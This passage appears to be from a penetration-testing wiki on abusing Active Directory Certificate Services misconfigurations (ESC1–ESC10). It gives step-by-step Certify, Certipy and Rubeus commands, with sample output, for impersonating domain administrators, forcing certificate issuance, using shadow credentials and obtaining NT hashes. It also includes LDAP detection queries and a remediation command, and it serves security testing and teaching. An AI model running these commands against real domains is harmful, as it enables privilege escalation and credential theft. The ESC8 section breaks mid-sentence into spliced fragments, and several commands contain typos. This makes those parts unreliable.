  ### Explanation\n\n### Misconfigured Certificate Templates - ESC1 Explained\n\n- **Enrolment rights are granted to low-privileged\
  \ users by the Enterprise CA.**\n- **Manager approval is not required.**\n- **No signatures from authorized personnel are\
  \ needed.**\n- **Security descriptors on certificate templates are overly permissive, allowing low-privileged users to obtain\
  \ enrolment rights.**\n- **Certificate templates are configured to define EKUs that facilitate authentication:**\n  - Extended\
  \ Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4),\
  \ Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.\n- **The\
  \ ability for requesters to include a subjectAltName in the Certificate Signing Request (CSR) is allowed by the template:**\n\
  \  - The Active Directory (AD) prioritizes the subjectAltName (SAN) in a certificate for identity verification if present.\
  \ This means that by specifying the SAN in a CSR, a certificate can be requested to impersonate any user (e.g., a domain\
  \ administrator). Whether a SAN can be specified by the requester is indicated in the certificate template's AD object through\
  \ the `mspki-certificate-name-flag` property. This property is a bitmask, and the presence of the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`\
  \ flag permits the specification of the SAN by the requester.\n\n> [!CAUTION]\n> The configuration outlined permits low-privileged\
  \ users to request certificates with any SAN of choice, enabling authentication as any domain principal through Kerberos\
  \ or SChannel.\n\nThis feature is sometimes enabled to support the on-the-fly generation of HTTPS or host certificates by\
  \ products or deployment services, or due to a lack of understanding.\n\nIt is noted that creating a certificate with this\
  \ option triggers a warning, which is not the case when an existing certificate template (such as the `WebServer` template,\
  \ which has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` enabled) is duplicated and then modified to include an authentication OID.\n\
  \n### Abuse\n\nTo **find vulnerable certificate templates** you can run:\n\n```bash\nCertify.exe find /vulnerable\ncertipy\
  \ find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128\n```\n\nTo **abuse this vulnerability to impersonate\
  \ an administrator** one could run:\n\n```bash\n# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)\n\
  Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local\n\n# Optionally pin\
  \ the target's SID into the request (post-2022 SID mapping aware)\nCertify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate\
  \ /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500\n\n# Some CAs accept an otherName/URL SAN attribute\
  \ carrying the SID value as well\nCertify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator\
  \ \\\n  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500\n\n# Certipy equivalent\ncertipy\
  \ req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \\\n  -template 'ESC1' -upn 'administrator@corp.local'\n\
  ```\n\nThen you can transform the generated **certificate to `.pfx`** format and use it to **authenticate using Rubeus or\
  \ certipy** again:\n\n```bash\nRubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt\n\
  certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100\n```\n\nThe Windows\
  \ binaries \"Certreq.exe\" & \"Certutil.exe\" can be used to generate the PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee\n\
  \nThe enumeration of certificate templates within the AD Forest's configuration schema, specifically those not necessitating\
  \ approval or signatures, possessing a Client Authentication or Smart Card Logon EKU, and with the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`\
  \ flag enabled, can be performed by running the following LDAP query:\n\n```\n(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))\n\
  ```\n\n## Misconfigured Certificate Templates - ESC2\n\n### Explanation\n\nThe second abuse scenario is a variation of the\
  \ first one:\n\n1. Enrollment rights are granted to low-privileged users by the Enterprise CA.\n2. The requirement for manager\
  \ approval is disabled.\n3. The need for authorized signatures is omitted.\n4. An overly permissive security descriptor\
  \ on the certificate template grants certificate enrollment rights to low-privileged users.\n5. **The certificate template\
  \ is defined to include the Any Purpose EKU or no EKU.**\n\nThe **Any Purpose EKU** permits a certificate to be obtained\
  \ by an attacker for **any purpose**, including client authentication, server authentication, code signing, etc. The same\
  \ **technique used for ESC3** can be employed to exploit this scenario.\n\nCertificates with **no EKUs**, which act as subordinate\
  \ CA certificates, can be exploited for **any purpose** and can **also be used to sign new certificates**. Hence, an attacker\
  \ could specify arbitrary EKUs or fields in the new certificates by utilizing a subordinate CA certificate.\n\nHowever,\
  \ new certificates created for **domain authentication** will not function if the subordinate CA is not trusted by the **`NTAuthCertificates`**\
  \ object, which is the default setting. Nonetheless, an attacker can still create **new certificates with any EKU** and\
  \ arbitrary certificate values. These could be potentially **abused** for a wide range of purposes (e.g., code signing,\
  \ server authentication, etc.) and could have significant implications for other applications in the network like SAML,\
  \ AD FS, or IPSec.\n\nTo enumerate templates that match this scenario within the AD Forest’s configuration schema, the following\
  \ LDAP query can be run:\n\n```\n(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))\n\
  ```\n\n## Misconfigured Enrolment Agent Templates - ESC3\n\n### Explanation\n\nThis scenario is like the first and second\
  \ one but **abusing** a **different EKU** (Certificate Request Agent) and **2 different templates** (therefore it has 2\
  \ sets of requirements),\n\nThe **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), known as **Enrollment Agent**\
  \ in Microsoft documentation, allows a principal to **enroll** for a **certificate** on **behalf of another user**.\n\n\
  The **“enrollment agent”** enrolls in such a **template** and uses the resulting **certificate to co-sign a CSR on behalf\
  \ of the other user**. It then **sends** the **co-signed CSR** to the CA, enrolling in a **template** that **permits “enroll\
  \ on behalf of”**, and the CA responds with a **certificate belong to the “other” user**.\n\n**Requirements 1:**\n\n- Enrollment\
  \ rights are granted to low-privileged users by the Enterprise CA.\n- The requirement for manager approval is omitted.\n\
  - No requirement for authorized signatures.\n- The security descriptor of the certificate template is excessively permissive,\
  \ granting enrollment rights to low-privileged users.\n- The certificate template includes the Certificate Request Agent\
  \ EKU, enabling the request of other certificate templates on behalf of other principals.\n\n**Requirements 2:**\n\n- The\
  \ Enterprise CA grants enrollment rights to low-privileged users.\n- Manager approval is bypassed.\n- The template's schema\
  \ version is either 1 or exceeds 2, and it specifies an Application Policy Issuance Requirement that necessitates the Certificate\
  \ Request Agent EKU.\n- An EKU defined in the certificate template permits domain authentication.\n- Restrictions for enrollment\
  \ agents are not applied on the CA.\n\n### Abuse\n\nYou can use [**Certify**](https://github.com/GhostPack/Certify) or [**Certipy**](https://github.com/ly4k/Certipy)\
  \ to abuse this scenario:\n\n```bash\n# Request an enrollment agent certificate\nCertify.exe request /ca:DC01.DOMAIN.LOCAL\\\
  DOMAIN-CA /template:Vuln-EnrollmentAgent\ncertipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local'\
  \ -ca 'corp-CA' -template 'templateName'\n\n# Enrollment agent certificate to issue a certificate request on behalf of\n\
  # another user to a template that allow for domain authentication\nCertify.exe request /ca:DC01.DOMAIN.LOCAL\\DOMAIN-CA\
  \ /template:User /onbehalfof:CORP\\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf\ncertipy req -username john@corp.local\
  \ -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\\administrator' -pfx 'john.pfx'\n\
  \n# Use Rubeus with the certificate to authenticate as the other user\nRubeu.exe asktgt /user:CORP\\itadmin /certificate:itadminenrollment.pfx\
  \ /password:asdf\n```\n\nThe **users** who are allowed to **obtain** an **enrollment agent certificate**, the templates\
  \ in which enrollment **agents** are permitted to enroll, and the **accounts** on behalf of which the enrollment agent may\
  \ act can be constrained by enterprise CAs. This is achieved by opening the `certsrc.msc` **snap-in**, **right-clicking\
  \ on the CA**, **clicking Properties**, and then **navigating** to the “Enrollment Agents” tab.\n\nHowever, it is noted\
  \ that the **default** setting for CAs is to “**Do not restrict enrollment agents**.” When the restriction on enrollment\
  \ agents is enabled by administrators, setting it to “Restrict enrollment agents,” the default configuration remains extremely\
  \ permissive. It allows **Everyone** access to enroll in all templates as anyone.\n\n## Vulnerable Certificate Template\
  \ Access Control - ESC4\n\n### **Explanation**\n\nThe **security descriptor** on **certificate templates** defines the **permissions**\
  \ specific **AD principals** possess concerning the template.\n\nShould an **attacker** possess the requisite **permissions**\
  \ to **alter** a **template** and **institute** any **exploitable misconfigurations** outlined in **prior sections**, privilege\
  \ escalation could be facilitated.\n\nNotable permissions applicable to certificate templates include:\n\n- **Owner:** Grants\
  \ implicit control over the object, allowing for the modification of any attributes.\n- **FullControl:** Enables complete\
  \ authority over the object, including the capability to alter any attributes.\n- **WriteOwner:** Permits the alteration\
  \ of the object's owner to a principal under the attacker's control.\n- **WriteDacl:** Allows for the adjustment of access\
  \ controls, potentially granting an attacker FullControl.\n- **WriteProperty:** Authorizes the editing of any object properties.\n\
  \n### Abuse\n\nTo identify principals with edit rights on templates and other PKI objects, enumerate with Certify:\n\n```bash\n\
  Certify.exe find /showAllPermissions\nCertify.exe pkiobjects /domain:corp.local /showAdmins\n```\n\nAn example of a privesc\
  \ like the previous one:\n\n<figure><img src=\"../../../images/image (814).png\" alt=\"\"><figcaption></figcaption></figure>\n\
  \nESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the\
  \ configuration of the certificate template to make the template vulnerable to ESC1.\n\nAs we can see in the path above,\
  \ only `JOHNPC` has these privileges, but our user `JOHN` has the new `AddKeyCredentialLink` edge to `JOHNPC`. Since this\
  \ technique is related to certificates, I have implemented this attack as well, which is known as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab).\
  \ Here’s a little sneak peak of Certipy’s `shadow auto` command to retrieve the NT hash of the victim.\n\n```bash\ncertipy\
  \ shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'\n```\n\n**Certipy** can overwrite the configuration\
  \ of a certificate template with a single command. By **default**, Certipy will **overwrite** the configuration to make\
  \ it **vulnerable to ESC1**. We can also specify the **`-save-old` parameter to save the old configuration**, which will\
  \ be useful for **restoring** the configuration after our attack.\n\n```bash\n# Make template vuln to ESC1\ncertipy template\
  \ -username john@corp.local -password Passw0rd -template ESC4-Test -save-old\n\n# Exploit ESC1\ncertipy req -username john@corp.local\
  \ -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local\n\n# Restore\
  \ config\ncertipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json\n\
  ```\n\n## Vulnerable PKI Object Access Control - ESC5\n\n### Explanation\n\nThe extensive web of interconnected ACL-based\
  \ relationships, which includes several objects beyond certificate templates and the certificate authority, can impact the\
  \ security of the entire AD CS system. These objects, which can significantly affect security, encompass:\n\n- The AD computer\
  \ object of the CA server, which may be compromised through mechanisms like S4U2Self or S4U2Proxy.\n- The RPC/DCOM server\
  \ of the CA server.\n- Any descendant AD object or container within the specific container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`.\
  \ This path includes, but is not limited to, containers and objects such as the Certificate Templates container, Certification\
  \ Authorities container, the NTAuthCertificates object, and the Enrollment Services Container.\n\nThe security of the PKI\
  \ system can be compromised if a low-privileged attacker manages to gain control over any of these critical components.\n\
  \n## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6\n\n### Explanation\n\nThe subject discussed in the [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage)\
  \ also touches on the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag's implications, as outlined by Microsoft. This configuration,\
  \ when activated on a Certification Authority (CA), permits the inclusion of **user-defined values** in the **subject alternative\
  \ name** for **any request**, including those constructed from Active Directory®. Consequently, this provision allows an\
  \ **intruder** to enroll through **any template** set up for domain **authentication**—specifically those open to **unprivileged**\
  \ user enrollment, like the standard User template. As a result, a certificate can be secured, enabling the intruder to\
  \ authenticate as a domain administrator or **any other active entity** within the domain.\n\n**Note**: The approach for\
  \ appending **alternative names** into a Certificate Signing Request (CSR), through the `-attrib \"SAN:\"` argument in `certreq.exe`\
  \ (referred to as “Name Value Pairs”), presents a **contrast** from the exploitation strategy of SANs in ESC1. Here, the\
  \ distinction lies in **how account information is encapsulated**—within a certificate attribute, rather than an extension.\n\
  \n### Abuse\n\nTo verify whether the setting is activated, organizations can utilize the following command with `certutil.exe`:\n\
  \n```bash\ncertutil -config \"CA_HOST\\CA_NAME\" -getreg \"policy\\EditFlags\"\n```\n\nThis operation essentially employs\
  \ **remote registry access**, hence, an alternative approach might be:\n\n```bash\nreg.exe query \\\\<CA_SERVER>\\HKEY_LOCAL_MACHINE\\\
  SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\<CA_NAME>\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\\\
  \ /v EditFlags\n```\n\nTools like [**Certify**](https://github.com/GhostPack/Certify) and [**Certipy**](https://github.com/ly4k/Certipy)\
  \ are capable of detecting this misconfiguration and exploiting it:\n\n```bash\n# Detect vulnerabilities, including this\
  \ one\nCertify.exe find\n\n# Exploit vulnerability\nCertify.exe request /ca:dc.domain.local\\theshire-DC-CA /template:User\
  \ /altname:localadmin\ncertipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template\
  \ User -upn administrator@corp.local\n```\n\nTo alter these settings, assuming one possesses **domain administrative** rights\
  \ or equivalent, the following command can be executed from any workstation:\n\n```bash\ncertutil -config \"CA_HOST\\CA_NAME\"\
  \ -setreg policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2\n```\n\nTo disable this configuration in your environment, the\
  \ flag can be removed with:\n\n```bash\ncertutil -config \"CA_HOST\\CA_NAME\" -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2\n\
  ```\n\n> [!WARNING]\n> Post the May 2022 security updates, newly issued **certificates** will contain a **security extension**\
  \ that incorporates the **requester's `objectSid` property**. For ESC1, this SID is derived from the specified SAN. However,\
  \ for **ESC6**, the SID mirrors the **requester's `objectSid`**, not the SAN.\\\n> To exploit ESC6, it is essential for\
  \ the system to be susceptible to ESC10 (Weak Certificate Mappings), which prioritizes the **SAN over the new security extension**.\n\
  \n## Vulnerable Certificate Authority Access Control - ESC7\n\n### Attack 1\n\n#### Explanation\n\nAccess control for a\
  \ certificate authority is maintained through a set of permissions that govern CA actions. These permissions can be viewed\
  \ by accessing `certsrv.msc`, right-clicking a CA, selecting properties, and then navigating to the Security tab. Additionally,\
  \ permissions can be enumerated using the PSPKI module with commands such as:\n\n```bash\nGet-CertificationAuthority -ComputerName\
  \ dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access\n```\n\nThis provides insights into the primary\
  \ rights, namely **`ManageCA`** and **`ManageCertificates`**, correlating to the roles of “CA administrator” and “Certificate\
  \ Manager” respectively.\n\n#### Abuse\n\nHaving **`ManageCA`** rights on a certificate authority enables the principal\
  \ to manipulate settings remotely using PSPKI. This includes toggling the **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag to permit\
  \ SAN specification in any template, a critical aspect of domain escalation.\n\nSimplification of this process is achievable\
  \ through the use of PSPKI’s **Enable-PolicyModuleFlag** cmdlet, allowing modifications without direct GUI interaction.\n\
  \nPossession of **`ManageCertificates`** rights facilitates the approval of pending requests, effectively circumventing\
  \ the \"CA certificate manager approval\" safeguard.\n\nA combination of **Certify** and **PSPKI** modules can be utilized\
  \ to request, approve, and download a certificate:\n\n```bash\n# Request a certificate that will require an approval\nCertify.exe\
  \ request /ca:dc.domain.local\\theshire-DC-CA /template:ApprovalNeeded\n[...]\n[*] CA Response      : The certificate is\
  \ still pending.\n[*] Request ID       : 336\n[...]\n\n# Use PSPKI module to approve the request\nImport-Module PSPKI\n\
  Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest\n\
  \n# Download the certificate\nCertify.exe download /ca:dc.domain.local\\theshire-DC-CA /id:336\n```\n\n### Attack 2\n\n\
  #### Explanation\n\n> [!WARNING]\n> In the **previous attack** **`Manage CA`** permissions were used to **enable** the **EDITF_ATTRIBUTESUBJECTALTNAME2**\
  \ flag to perform the **ESC6 attack**, but this will not have any effect until the CA service (`CertSvc`) is restarted.\
  \ When a user has the `Manage CA` access right, the user is also allowed to **restart the service**. However, it **does\
  \ not mean that the user can restart the service remotely**. Furthermore, E**SC6 might not work out of the box** in most\
  \ patched environments due to the May 2022 security updates.\n\nTherefore, another attack is presented here.\n\nPerquisites:\n\
  \n- Only **`ManageCA` permission**\n- **`Manage Certificates`** permission (can be granted from **`ManageCA`**)\n- Certificate\
  \ template **`SubCA`** must be **enabled** (can be enabled from **`ManageCA`**)\n\nThe technique relies on the fact that\
  \ users with the `Manage CA` _and_ `Manage Certificates` access right can **issue failed certificate requests**. The **`SubCA`**\
  \ certificate template is **vulnerable to ESC1**, but **only administrators** can enroll in the template. Thus, a **user**\
  \ can **request** to enroll in the **`SubCA`** - which will be **denied** - but **then issued by the manager afterwards**.\n\
  \n#### Abuse\n\nYou can **grant yourself the `Manage Certificates`** access right by adding your user as a new officer.\n\
  \n```bash\ncertipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd\nCertipy v4.0.0 -\
  \ by Oliver Lyak (ly4k)\n\n[*] Successfully added officer 'John' on 'corp-DC-CA'\n```\n\nThe **`SubCA`** template can be\
  \ **enabled on the CA** with the `-enable-template` parameter. By default, the `SubCA` template is enabled.\n\n```bash\n\
  # List templates\ncertipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template\
  \ 'SubCA'\n## If SubCA is not there, you need to enable it\n\n# Enable SubCA\ncertipy ca -ca 'corp-DC-CA' -enable-template\
  \ SubCA -username john@corp.local -password Passw0rd\nCertipy v4.0.0 - by Oliver Lyak (ly4k)\n\n[*] Successfully enabled\
  \ 'SubCA' on 'corp-DC-CA'\n```\n\nIf we have fulfilled the prerequisites for this attack, we can start by **requesting a\
  \ certificate based on the `SubCA` template**.\n\n**This request will be denie**d, but we will save the private key and\
  \ note down the request ID.\n\n```bash\ncertipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target\
  \ ca.corp.local -template SubCA -upn administrator@corp.local\nCertipy v4.0.0 - by Oliver Lyak (ly4k)\n\n[*] Requesting\
  \ certificate via RPC\n[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED -\
  \ The permissions on the certificate template do not allow the current user to enroll for this type of certificate.\n[*]\
  \ Request ID is 785\nWould you like to save the private key? (y/N) y\n[*] Saved private key to 785.key\n[-] Failed to request\
  \ certificate\n```\n\nWith our **`Manage CA` and `Manage Certificates`**, we can then **issue the failed certificate** request\
  \ with the `ca` command and the `-issue-request <request ID>` parameter.\n\n```bash\ncertipy ca -ca 'corp-DC-CA' -issue-request\
  \ 785 -username john@corp.local -password Passw0rd\nCertipy v4.0.0 - by Oliver Lyak (ly4k)\n\n[*] Successfully issued certificate\n\
  ```\n\nAnd finally, we can **retrieve the issued certificate** with the `req` command and the `-retrieve <request ID>` parameter.\n\
  \n```bash\ncertipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785\n\
  Certipy v4.0.0 - by Oliver Lyak (ly4k)\n\n[*] Rerieving certificate with ID 785\n[*] Successfully retrieved certificate\n\
  [*] Got certificate with UPN 'administrator@corp.local'\n[*] Certificate has no object SID\n[*] Loaded private key from\
  \ '785.key'\n[*] Saved certificate and private key to 'administrator.pfx'\n```\n\n### Attack 3 – Manage Certificates Extension\
  \ Abuse (SetExtension)\n\n#### Explanation\n\nIn addition to the classic ESC7 abuses (enabling EDITF attributes or approving\
  \ pending requests), **Certify 2.0** revealed a brand-new primitive that only requires the *Manage Certificates* (a.k.a.\
  \ **Certificate Manager / Officer**) role on the Enterprise CA.\n\nThe `ICertAdmin::SetExtension` RPC method can be executed\
  \ by any principal holding *Manage Certificates*.  While the method was traditionally used by legitimate CAs to update extensions\
  \ on **pending** requests, an attacker can abuse it to **append a *non-default* certificate extension** (for example a custom\
  \ *Certificate Issuance Policy* OID such as `1.1.1.1`) to a request that is waiting for approval.\n\nBecause the targeted\
  \ template does **not define a default value for that extension**, the CA will NOT overwrite the attacker-controlled value\
  \ when the request is eventually issued.  The resulting certificate therefore contains an attacker-chosen extension that\
  \ may:\n\n* Satisfy Application / Issuance Policy requirements of other vulnerable templates (leading to privilege escalation).\n\
  * Inject additional EKUs or policies that grant the certificate unexpected trust in third-party systems.\n\nIn short, *Manage\
  \ Certificates* – previously considered the “less powerful” half of ESC7 – can now be leveraged for full privilege escalation\
  \ or long-term persistence, without touching CA configuration or requiring the more restrictive *Manage CA* right.\n\n####\
  \ Abusing the primitive with Certify 2.0\n\n1. **Submit a certificate request that will remain *pending*.**  This can be\
  \ forced with a template that requires manager approval:\n   ```powershell\n   Certify.exe request --ca SERVER\\\\CA-NAME\
  \ --template SecureUser --subject \"CN=User\" --manager-approval\n   # Take note of the returned Request ID\n   ```\n\n\
  2. **Append a custom extension to the pending request** using the new `manage-ca` command:\n   ```powershell\n   Certify.exe\
  \ manage-ca --ca SERVER\\\\CA-NAME \\\n                     --request-id 1337 \\\n                     --set-extension \"\
  1.1.1.1=DER,10,01 01 00 00\"  # fake issuance-policy OID\n   ```\n   *If the template does not already define the *Certificate\
  \ Issuance Policies* extension, the value above will be preserved after issuance.*\n\n3. **Issue the request** (if your\
  \ role also has *Manage Certificates* approval rights) or wait for an operator to approve it.  Once issued, download the\
  \ certificate:\n   ```powershell\n   Certify.exe request-download --ca SERVER\\\\CA-NAME --id 1337\n   ```\n\n4. The resulting\
  \ certificate now contains the malicious issuance-policy OID and can be used in subsequent attacks (e.g. ESC13, domain escalation,\
  \ etc.).\n\n> NOTE:  The same attack can be executed with Certipy ≥ 4.7 through the `ca` command and the `-set-extension`\
  \ parameter.\n\n## NTLM Relay to AD CS HTTP Endpoints – ESC8\n\n### Explanation\n\n> [!TIP]\n> In environments where **AD\
  \ CS is installed**, if a **web enrollment endpoint vulnerable** exists and at least one **certificate template is published**\
  \ that permits **domain computer enrollment and client authentication** (such as the default **`Machine`** template), it\
  \ becomes possible for **any computer with the spooler service active to be compromised by an attacker**!\n\nSeveral **HTTP-based\
  \ enrollment methods** are supported by AD CS, made available through additional server roles that administrators may install.\
  \ These interfaces for HTTP-based certificate enrollment are susceptible to **NTLM relay attacks**. An attacker, from a\
  \ **compromised machine, can impersonate any AD account that authenticates via inbound NTLM**. While impersonating the victim\
  \ account, these web interfaces can be accessed by an attacker to **request a client authentication certificate using the\
  \ `User` or `Machine` certificate templates**.\n\n- The **web enrollment interface** (an older ASP application available\
  \ at `http://<caserver>/certsrv/`), defaults to HTTP only, which does not offer protection against NTLM relay attacks. Additionally,\
  \ it explicitly permits only NTLM authentication through its Authorization HTTP header, rendering more secure authentication\
  \ methods like Kerberos inapplicable.\n- The **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy**\
  \ (CEP) Web Service, and **Network Device Enrollment Service** (NDES) by default support negotiate authentication via their\
  \ Authorization HTTP header. Negotiate authentication **supports both** Kerberos and **NTLM**, allowing an attacker to **downgrade\
  \ to NTLM** authentication during relay attacks. Although these web services enable HTTPS by default, HTTPS alone **does\
  \ not safeguard against NTLM relay attacks**. Protection from NTLM relay attacks for HTTPS services is only possible when\
  \ HTTPS is combined with channel binding. Regrettably, AD CS does not activate Extended Protection for Authentication on\
  \ IIS, which is required for channel binding.\n\nA common **issue** with NTLM relay attacks is the **short duration of NTLM\
  \ sessions** and the inability of the attacker to interact with services that **require NTLM signing**.\n\nNevertheless,\
  \ this limitation is overcome by exploiting an NTLM relay attack to acquire a certificate for the user, as the certificate's\
  \ validity period dictates the session's duration, and the certificate can be employed with services that **mandate NTLM\
  \ signing**. For instructions on utilizing a stolen certificate, refer to:\n\n\n{{#ref}}\naccount-persistence.md\n{{#endref}}\n\
  \nAnother limitation of NTLM relay attacks is that **an attacker-controlled machine must be authenticated to by a victim\
  \ account**. The attacker could either wait or attempt to **force** this authentication:\n\n\n{{#ref}}\n../printers-spooler-service-abuse.md\n\

  \ alternative template can be achieved through the use of the `-template` parameter.\n\nA technique like [PetitPotam](https://github.com/ly4k/PetitPotam)\

  \ href=\"#id-5485\" id=\"id-5485\"></a>\n\n### Explanation\n\nThe new value **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`)\
  \ for **`msPKI-Enrollment-Flag`**, referred to as ESC9, prevents the embedding of the **new `szOID_NTDS_CA_SECURITY_EXT`\
  \ security extension** in a certificate. This flag becomes relevant when `StrongCertificateBindingEnforcement` is set to\
  \ `1` (the default setting), which contrasts with a setting of `2`. Its relevance is heightened in scenarios where a weaker\
  \ certificate mapping for Kerberos or Schannel might be exploited (as in ESC10), given that the absence of ESC9 would not\
  \ alter the requirements.\n\nThe conditions under which this flag's setting becomes significant include:\n\n- `StrongCertificateBindingEnforcement`\
  \ is not adjusted to `2` (with the default being `1`), or `CertificateMappingMethods` includes the `UPN` flag.\n- The certificate\
  \ is marked with the `CT_FLAG_NO_SECURITY_EXTENSION` flag within the `msPKI-Enrollment-Flag` setting.\n- Any client authentication\
  \ EKU is specified by the certificate.\n- `GenericWrite` permissions are available over any account to compromise another.\n\
  \n### Abuse Scenario\n\nSuppose `John@corp.local` holds `GenericWrite` permissions over `Jane@corp.local`, with the goal\
  \ to compromise `Administrator@corp.local`. The `ESC9` certificate template, which `Jane@corp.local` is permitted to enroll\
  \ in, is configured with the `CT_FLAG_NO_SECURITY_EXTENSION` flag in its `msPKI-Enrollment-Flag` setting.\n\nInitially,\
  \ `Jane`'s hash is acquired using Shadow Credentials, thanks to `John`'s `GenericWrite`:\n\n```bash\ncertipy shadow auto\
  \ -username John@corp.local -password Passw0rd! -account Jane\n```\n\nSubsequently, `Jane`'s `userPrincipalName` is modified\
  \ to `Administrator`, purposely omitting the `@corp.local` domain part:\n\n```bash\ncertipy account update -username John@corp.local\
  \ -password Passw0rd! -user Jane -upn Administrator\n```\n\nThis modification does not violate constraints, given that `Administrator@corp.local`\
  \ remains distinct as `Administrator`'s `userPrincipalName`.\n\nFollowing this, the `ESC9` certificate template, marked\
  \ vulnerable, is requested as `Jane`:\n\n```bash\ncertipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template\
  \ ESC9\n```\n\nIt's noted that the certificate's `userPrincipalName` reflects `Administrator`, devoid of any “object SID”.\n\
  \n`Jane`'s `userPrincipalName` is then reverted to her original, `Jane@corp.local`:\n\n```bash\ncertipy account update -username\
  \ John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local\n```\n\nAttempting authentication with the issued\
  \ certificate now yields the NT hash of `Administrator@corp.local`. The command must include `-domain <domain>` due to the\
  \ certificate's lack of domain specification:\n\n```bash\ncertipy auth -pfx adminitrator.pfx -domain corp.local\n```\n\n\
  ## Weak Certificate Mappings - ESC10\n\n### Explanation\n\nTwo registry key values on the domain controller are referred\
  \ to by ESC10:\n\n- The default value for `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\\
  Control\\SecurityProviders\\Schannel` is `0x18` (`0x8 | 0x10`), previously set to `0x1F`.\n- The default setting for `StrongCertificateBindingEnforcement`\
  \ under `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Kdc` is `1`, previously `0`.\n\n**Case 1**\n\nWhen `StrongCertificateBindingEnforcement`\
  \ is configured as `0`.\n\n**Case 2**\n\nIf `CertificateMappingMethods` includes the `UPN` bit (`0x4`).\n\n### Abuse Case\
  \ 1\n\nWith `StrongCertificateBindingEnforcement` configured as `0`, an account A with `GenericWrite` permissions can be\
  \ exploited to compromise any account B.\n\nFor instance, having `GenericWrite` permissions over `Jane@corp.local`, an attacker\
  \ aims to compromise `Administrator@corp.local`. The procedure mirrors ESC9, allowing any certificate template to be utilized.\n\
  \nInitially, `Jane`'s hash is retrieved using Shadow Credentials, exploiting the `GenericWrite`.\n\n```bash\ncertipy shadow\
  \ autho -username John@corp.local -p Passw0rd! -a Jane\n```\n\nSubsequently, `Jane`'s `userPrincipalName` is altered to\
  \ `Administrator`, deliberately omitting the `@corp.local` portion to avoid a constraint violation.\n\n```bash\ncertipy\
  \ account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator\n```\n\nFollowing this, a certificate\
  \ enabling client authentication is requested as `Jane`, using the default `User` template.\n\n```bash\ncertipy req -ca\
  \ 'corp-DC-CA' -username Jane@corp.local -hashes <hash>\n```\n\n`Jane`'s `userPrincipalName` is then reverted to its original,\
  \ `Jane@corp.local`.\n\n```bash\ncertipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local\n\
  ```\n\nAuthenticating with the obtained certificate will yield the NT hash of `Administrator@corp.local`, necessitating\
  \ the specification of the domain in the command due to the absence of domain details in the certificate.\n\n```bash\ncertipy\
